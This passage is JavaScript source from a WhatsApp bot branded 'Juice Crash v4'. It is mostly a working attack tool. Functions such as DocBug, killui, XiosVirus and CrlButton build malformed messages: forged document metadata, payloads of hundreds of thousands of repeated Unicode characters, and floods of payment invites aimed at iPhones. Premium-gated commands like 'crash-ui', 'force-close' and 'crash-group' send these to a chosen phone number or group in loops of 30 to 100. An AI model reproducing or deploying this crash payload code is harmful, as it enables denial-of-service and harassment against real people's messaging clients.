    let akumw = "⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄" + "ꦿꦾ꧀".repeat(50000);
    await AndraZyy.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: " TrashDex Explanation ",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: akumw
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "anjay" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function DocBug(target) {
 let virtex = "⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄";
   AndraZyy.relayMessage(target, {
     groupMentionedMessage: {
       message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "99999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝐉𝐮𝐢𝐜𝐞" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
async function LocaBugs(target) {
 await AndraZyy.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄`+'ꦾ'.repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function killui(target, Ptcp = true) {
      await AndraZyy.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                    fileName: "⿻",
                    fileEncSha256:
                      "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                    directPath:
                      "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1726867151",
                    contactVcard: true,
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄\n" + "ꦾ".repeat(28000),
                },
                nativeFlowMessage: {
                  messageParamsJson: "{}",
                },
                contextInfo: {
                  mentionedJid: ["18492098766@s.whatsapp.net"],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "Дѵөҫдԁө Ԍҵдѵд tђคเlคภ๔",
                      fileEncSha256:
                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                  },
                },
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }
    
async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await AndraZyy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
    
async function func1(target) {
    await AndraZyy.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄" + "ꦹꦹꦹ".repeat(400000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " 𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function aipong(target) {
await AndraZyy.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}
async function iponcrash(target) {
await AndraZyy.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
sleep(200)
await AndraZyy.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
sleep(200)
await AndraZyy.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
}
//bug ios
async function UpiCrash(target) {
      await AndraZyy.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function VenCrash(target) {
      await AndraZyy.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "VENMO",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function AppXCrash(target) {
      await AndraZyy.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "CASHAPP",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function SmCrash(target) {
      await AndraZyy.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "SAMSUNGPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

async function newsLetter(target) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: `33333333333333333@newsletter`,
                                newsletterName: "NassCrashV1" + "ી".repeat(120000),
                                jpegThumbnail: "",
                                caption: "ꦽ".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await AndraZyy.relayMessage(target, messsage, {
                    userJid: target,
                });
            }
            catch (err) {
                console.log(err)
            }
        }

    async function SqCrash(target) {
      await AndraZyy.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "SQUARE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function FBiphone(target) {
      await AndraZyy.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "FBPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QXIphone(target) {
      let CrashQAiphone = "𑇂𑆵𑆴𑆿".repeat(60000);
      await AndraZyy.relayMessage(
        target,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: CrashQAiphone,
            url: "https://t.me/AndraZyy_Agler_Forger",
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QPayIos(target) {
      await AndraZyy.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "PAYPAL",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QPayStriep(target) {
      await AndraZyy.relayMessage(
        target,
        {
          paymentInviteMessage: {
            serviceType: "STRIPE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        }
      );
    }

    async function QDIphone(target) {
      AndraZyy.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "ꦾ".repeat(55000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄" + "ꦾ࣯࣯".repeat(50000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }

    //
    async function XiosVirus(target) {
      AndraZyy.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: `⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄` + "࣯ꦾ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄" + "ꦾ".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: target,
          },
        },
        {
          messageId: null,
        }
      );
    }

 //FUNCTION BUG GROUP 👇
    async function CallGc(isTarget) {
await AndraZyy.relayMessage(isTarget, {
            viewOnceMessage: {
                message: {
                    scheduledCallCreationMessage: {
                        callType: "VIDEO",
                        scheduledTimestampMs: Date.now() + 9741,
                        title: " ⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄ " + `𑲭𑲭`.repeat(100000) + `ꦾ`.repeat(50000),
                        inviteCode: 'youtube.com/@stokrapip',
                    }
                }
            }
        }, {});
      }

 async function CrlButton(isTarget) {
    const msg = generateWAMessageFromContent(
        isTarget,
        {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: `\0`
                        },
                        carouselMessage: {
                            cards: [
                                {
                                    header: {
                                        ...(await prepareWAMessageMedia(
                                            { image: { url: "https://files.catbox.moe/ia8je8.jpg" } }, 
                                            { upload: AndraZyy.waUploadToServer }
                                        )),
                                        title: `\0`,
                                        gifPlayback: true,
                                        subtitle: '\0',
                                        hasMediaAttachment: true
                                    },
                                    body: {
                                        text: `⚡ 𝐉𝐮𝐢𝐜𝐞 𝐂𝐫𝐚𝐬𝐡 𝐆𝐫𝐨𝐮𝐩` + "ꦾ".repeat(120000)
                                    },
                                    footer: {
                                        text: "\0"
                                    },
                                    nativeFlowMessage: {
                                        buttons: [
                                            {
                                                name: "single_select",
                                                buttonParamsJson: JSON.stringify({
                                                    title: "⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄",
                                                    sections: []
                                                })
                                            },
                                            {
                                                name: "single_select",
                                                buttonParamsJson: `{"title":"${"𑲭𑲭".repeat(60000)}","sections":[{"title":" i wanna be kill you ","rows":[]}]}`
                                            },
                                            {
                                                name: "call_permission_request",
                                                buttonParamsJson: "{}"
                                            },
                                            {
                                                name: "mpm",
                                                buttonParamsJson: "{}"
                                            },
                                            {
                                                name: "single_select",
                                                buttonParamsJson: "{\"title\":\"🦠\",\"sections\":[{\"title\":\"🔥\",\"highlight_label\":\"💥\",\"rows\":[{\"header\":\"\",\"title\":\"💧\",\"id\":\"⚡\"},{\"header\":\"\",\"title\":\"💣\",\"id\":\"✨\"}]}]}"
                                            },
                                            {
                                                name: "quick_reply",
                                                buttonParamsJson: "{\"display_text\":\"Quick Crash Reply\",\"id\":\"📌\"}"
                                            },
                                            {
                                                name: "cta_url",
                                                buttonParamsJson: "{\"display_text\":\"Developed\",\"url\":\"https://www.youtube.com/@Cella\",\"merchant_url\":\"https://www.youtube.com/@Cella\"}"
                                            },
                                            {
                                                name: "cta_call",
                                                buttonParamsJson: "{\"display_text\":\"Call Us Null\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "cta_copy",
                                                buttonParamsJson: "{\"display_text\":\"Copy Crash Code\",\"id\":\"message\",\"copy_code\":\"#CRASHCODE9741\"}"
                                            },
                                            {
                                                name: "cta_reminder",
                                                buttonParamsJson: "{\"display_text\":\"Set Reminder Crash\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "cta_cancel_reminder",
                                                buttonParamsJson: "{\"display_text\":\"Cancel Reminder Crash\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "address_message",
                                                buttonParamsJson: "{\"display_text\":\"Send Crash Address\",\"id\":\"message\"}"
                                            },
                                            {
                                                name: "send_location",
                                                buttonParamsJson: "\0"
                                            }
                                        ]
                                    }
                                }
                            ],
                            messageVersion: 1,
                        }
                    }
                }
            }
        },
        { quoted: VcardQuoted }
    );
    await AndraZyy.relayMessage(isTarget, msg.message, {
        messageId: msg.key.id,
    });
    console.log("Success! Crl Button Sent")
}
 // FUNC TERAKHIR 👆

const premium = JSON.parse(fs.readFileSync('./database/dtbs/premium.json'))
const isPremium = [botNumber, ...premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
AndraZyy.sendContact = async (jid, kon, quoted = '', opts = {}) => {
let list = []
for (let i of kon) {
list.push({
displayName: await AryaRyuigichi.getName(i),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await deltaJomok.getName(i + '@s.whatsapp.net')}\n
FN:${await deltaJomok.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:deltaonexi@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://github.com/yoshi-xhurayra\n
item3.X-ABLabel:GitHub\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}
AndraZyy.sendMessage(jid, { contacts: { displayName: `${list.length} Contact`, contacts: list }, ...opts }, { quoted })
}




const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}
    const fkethmb = await reSize(ppuser, 300, 300)
    
    let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};

async function downloadMp3 (link) {
try {
AndraZyy.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let kyuu = await fetchJson (`https://api.kyuurzy.site/api/download/aio?query=${link}`)
AndraZyy.sendMessage(m.chat, { audio: {url: kyuu.result.url}, mimetype: "audio/mpeg"},{ quoted:m})
}catch (err) {
reply(`${err}`)
}
}

async function downloadMp4 (link) {
try {
AndraZyy.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let kyuu = await fetchJson(`https://api.kyuurzy.site/api/download/aio?query=${link}`)
AndraZyy.sendMessage(m.chat, { video: {url: kyuu.result.url}, caption: '' },{ quoted:m})
}catch (err) {
reply(`${err}`)
}
}


global.public = true
if (!global.public) {
if (!m.key.fromMe && !isCreator) return
}


const reply = (teks) => { 
AndraZyy.sendMessage(from, { text: teks, contextInfo: { 
"externalAdReply": { 
"showAdAttribution": true, 
"title": "⸙‹•═᪣᧒ꪊỉᨶꫀ ᨶꪹꪖకꫝ ꪜ4 🐯᭄", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://whatsapp.com/channel/0029Vb1ns4CKQuJCFJN1gJ3T", 
"sourceUrl": "https://whatsapp.com/channel/0029Vb1ns4CKQuJCFJN1gJ3T" }}}, { quoted: m }) }

const reply2 = (teks) => {
AndraZyy.sendMessage(from, { text : teks }, { quoted : m })
}

function getFormattedDate() {
  var currentDate = new Date();
  var day = currentDate.getDate();
  var month = currentDate.getMonth() + 1;
  var year = currentDate.getFullYear();
  var hours = currentDate.getHours();
  var minutes = currentDate.getMinutes();
  var seconds = currentDate.getSeconds();
}

let d = new Date(new Date + 3600000)
let locale = 'id'
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let date = d.toLocaleDateString(locale, {
  day: 'numeric',
  month: 'long',
  year: 'numeric'
})
const hariini = d.toLocaleDateString('id', { day: 'numeric', month: 'long', year: 'numeric' })

function msToTime(duration) {
var milliseconds = parseInt((duration % 1000) / 100),
seconds = Math.floor((duration / 1000) % 60),
minutes = Math.floor((duration / (1000 * 60)) % 60),
hours = Math.floor((duration / (1000 * 60 * 60)) % 24)

hours = (hours < 10) ? "0" + hours : hours
minutes = (minutes < 10) ? "0" + minutes : minutes
seconds = (seconds < 10) ? "0" + seconds : seconds
return hours + " jam " + minutes + " menit " + seconds + " detik"
}

function msToDate(ms) {
		temp = ms
		days = Math.floor(ms / (24*60*60*1000));
		daysms = ms % (24*60*60*1000);
		hours = Math.floor((daysms)/(60*60*1000));
		hoursms = ms % (60*60*1000);
		minutes = Math.floor((hoursms)/(60*1000));
		minutesms = ms % (60*1000);
		sec = Math.floor((minutesms)/(1000));
		return days+" Hari "+hours+" Jam "+ minutes + " Menit";
  }
const timee = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(timee < "23:59:00"){
var waktuucapan = 'Selamat Malam'
}
if(timee < "19:00:00"){
var waktuucapan = 'Selamat Petang'
}
if(timee < "18:00:00"){
var waktuucapan = 'Selamat Sore'
}
if(timee < "15:00:00"){
var waktuucapan = 'Selamat Siang'
}
if(timee < "10:00:00"){
var waktuucapan = 'Selamat Pagi'
}
if(timee < "05:00:00"){
var waktuucapan = 'Selamat Subuh'
}
if(timee < "03:00:00"){
var waktuucapan = 'Selamat Tengah Malam'
}

switch(command) {
case 'x-bug': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'die': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'juice-crash': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'rimkus-off': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'dark': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'crash-ui': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
if (!isPremium) return reply(" Khusus Owner *Juice Crash v4* Dan *King Juice* ")
if (!q) {
return reply(`\`Example:\` : ${prefix+command} 1849×××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`);
for (let i = 0; i < 50; i++) {
await f10(target, Ptcp = true);
await IosMJ(target, Ptcp = true);
await f10(target, Ptcp = true);
await IosMJ(target, Ptcp = true);
await Bug2(isTarget);
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆`)
break;
case 'iphone': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'xios': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
if (!isPremium) return reply(" Khusus Owner *Juice Crash v4* Dan *King Juice* ")
if (!q) {
return reply(`\`Example:\` : ${prefix+command} 1849×××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`);
for (let i = 0; i < 50; i++) {
await f10(target, Ptcp = true);
await UpiCrash(target);
await VenCrash(target);
await AppXCrash(target);
await SmCrash(target);
await newsLetter(target);
await SqCrash(target);
await FBiphone(target);
await QXIphone(target);
await QPayIos(target);
await QPayStriep(target);
await QDIphone(target);
await XiosVirus(target);
await Bug2(isTarget);
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆`)
break;
case 'juice-system': case 'off-system': case 'kick-dvc': case 'ximune':
if (!isPremium) return reply(" Khusus Owner *Juice Crash v4* Dan *King Juice* ")
if (!q) {
return reply(`\`Example:\` : ${prefix+command} 1849×××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`);
for (let i = 0; i < 50; i++) {
await f10(target, Ptcp = true);
await IosMJ(target, Ptcp = true);
await DocBug(target);
await LocaBugs(target);
await crashui2(target, { ptcp: true });
await IosMJ(target, Ptcp = true);
await DocBug(target);
await LocaBugs(target);
await crashui2(target, { ptcp: true });
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆`)
break
case 'dark-angel': {
    if (!PremOnly) return ReplyImage("𝗡𝗼 𝗔𝗰𝗰𝗲𝘀𝘀")
    if (!q) return ReplyImage(`*Example: ${prefix + command} 1849xxx*`);
    let bijipler = q.replace(/[^0-9]/g, "");
    if (bijipler.startsWith('0')) {
        return m.reply(`*! Number starts with 0. Replace with a number that starts with the country code *\n\n_Example: ${prefix + command} 18492098766_`);
    };
    let target = bijipler + "@s.whatsapp.net";
    for (let i = 0; i < 10; i++) {
        await crashcursor(target)
    }
    await sleep(1000);
    await ReplyImage("Succes send Bug");
}
break
case 'juice1': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'rimkus2': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'crazy3': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'fc-bug': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'crash-fc': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case 'force-close': // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
if (!isPremium) return reply(" Khusus Owner *Juice Crash v4* Dan *King Juice* ")
if (!q) {
return reply(`\`Example:\` : ${prefix+command} 1849×××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`);
for (let i = 0; i < 30; i++) {
await f10(target, Ptcp = true);
await IosMJ(target, Ptcp = true);
await DocBug(target);
await LocaBugs(target);
await crashui2(target, { ptcp: true });
await IosMJ(target, Ptcp = true);
await DocBug(target);
await LocaBugs(target);
await crashui2(target, { ptcp: true });
}
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆`)
break;
case "dead-gc": // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
case "crash-group": // 𝗝𝘂𝗶𝗰𝗲 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧
{
if (!isPremium) return reply(" command rejected ");
reply(" command received ");
if (!q) return reply(`Example: \n ${prefix + command} https://chat.whatsapp.com/`
);
await sleep(1000);
reply(`Bot successfully sends a virus message`
);
let result = args[0].split("https://chat.whatsapp.com/")[1];
let isTarget = await AndraZyy.groupAcceptInvite(result);
for (let i = 0; i < 100; i++) {
await CrlButton(isTarget);
await CallGc(isTarget);
}
